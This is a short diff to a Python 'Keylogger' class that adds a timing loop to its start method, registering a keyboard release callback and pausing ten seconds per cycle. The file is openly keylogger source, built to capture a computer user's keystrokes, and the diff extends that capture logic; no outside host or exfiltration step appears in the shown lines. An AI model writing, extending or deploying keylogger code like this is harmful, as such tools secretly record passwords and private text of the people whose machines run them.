@@ -1,6 +1,7 @@
 import keyboard
 from datetime import datetime
 import base64
+import time
 
 class Keylogger:
     def __init__(self, report_method="file"):
@@ -38,3 +39,7 @@ class Keylogger:
     
     def start(self):
         while self.running: 
+            self.start_dt = datetime.now()
+            keyboard.on_release(callback=self.on_release)
+            time.sleep(10)  # Pause de 10 secondes
+            self.end_dt = datetime.now()
